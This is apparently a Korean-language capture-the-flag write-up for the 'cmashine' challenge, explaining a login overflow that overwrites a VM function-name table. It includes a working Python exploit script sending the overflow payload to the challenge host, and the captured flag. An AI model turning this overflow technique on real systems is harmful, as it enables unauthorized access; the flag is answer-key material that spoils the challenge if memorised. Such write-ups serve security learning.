---
ctf_name: "Midnight Sun CTF 2026"
challenge_name: "cmashine"
category: "rev"
difficulty: "medium"
author: "ttzero25"
date: "2026-05-10"
points: 1000
tags: [blackbox, VM]
---

# cmashine

## 문제 설명

> Sometimes reversing is just blackbox pwning.

- nc 포트 주소 제공

## 풀이

### 분석

1. 주어진 nc 포트로 내부에 접근해 `help`, `mem`, `functions` 명령어를 사용해 VM 명령어 목록을 열거하고, 노출된 메모리 및 함수 테이블을 확인한다.

2. `0x100` 주소부터 VM 메모리에 함수 이름이 저장되어 있으며, 첫 번째 슬롯이 `echo`를 가리키고 있음을 파악한다.

3. `login` 명령어의 오버플로우를 악용하여 256바이트의 패딩 뒤에 `flag\x00`을 전송함으로써, 첫 번째 함수 이름 슬롯을 `echo`에서 `flag`로 덮어쓴다.

4. `call flag`를 실행해 숨겨진 플래그 핸들러를 호출하고 플래그를 출력한다.

### 취약점

`login` 명령어는 입력된 패스워드를 VM 메모리에 복사할 때 **최대 512바이트**까지 허용하지만, 실제 사용자 제어 영역은 `0x100`(256)바이트에 불과하다.

함수 이름 테이블은 `mem[0x100]`부터 시작하며, `call` 명령어는 이 테이블을 참조하여 함수를 디스패치한다. 따라서 256바이트의 패딩으로 오버플로우를 일으켜 테이블의 첫 번째 함수 이름(`echo`)을 `flag`로 덮어쓰면, 원래는 호출할 수 없었던 숨겨진 플래그 핸들러를 `call flag`로 실행할 수 있게 된다.

### 익스플로잇

```python
#!/usr/bin/env python3
import socket
import time
import select
import re

HOST = "cmashine.play.ctf.se"
PORT = 9190

def recv_all(s, timeout=1.5):
    s.setblocking(False)
    out = b""
    end = time.time() + timeout
    while time.time() < end:
        try:
            r, _, _ = select.select([s], [], [], 0.05)
            if r:
                chunk = s.recv(8192)
                if not chunk:
                    break
                out += chunk
                end = time.time() + 0.25
        except Exception:
            break
    return out

def connect_retry():
    i = 0
    while True:
        i += 1
        try:
            s = socket.create_connection((HOST, PORT), timeout=0.7)
            print(f"[+] connected after {i} tries")
            return s
        except Exception:
            print(f"[-] offline try {i}")
            time.sleep(0.2)

# login은 VM 메모리에 최대 512바이트를 쓰지만, 사용자 영역은 0x100바이트뿐이다.
# 256바이트 이후부터 mem[0x100]의 함수 이름 테이블이 덮어써진다.
# 첫 번째 함수 이름 "echo"를 "flag"로 교체한다.
payload = b"login " + b"A" * 256 + b"flag" + b"\x00" * 16 + b"\n"
payload += b"call flag\n"

s = connect_retry()

try:
    banner = recv_all(s, 1.0)
    print(banner.decode(errors="replace"))

    print("[+] sending overflow payload...")
    s.sendall(payload)

    out = recv_all(s, 2.0)
    text = out.decode(errors="replace")
    print(text)

    m = re.search(r"midnight\{[^}]+\}", text)
    if m:
        print("[+] FLAG:", m.group(0))
    else:
        print("[!] flag not found in output")

finally:
    try:
        s.close()
    except Exception:
        pass
```

## 플래그

```
midnight{700_b1G_f0r_th3_m4ch1ne}
```

## 배운 점

blackbox
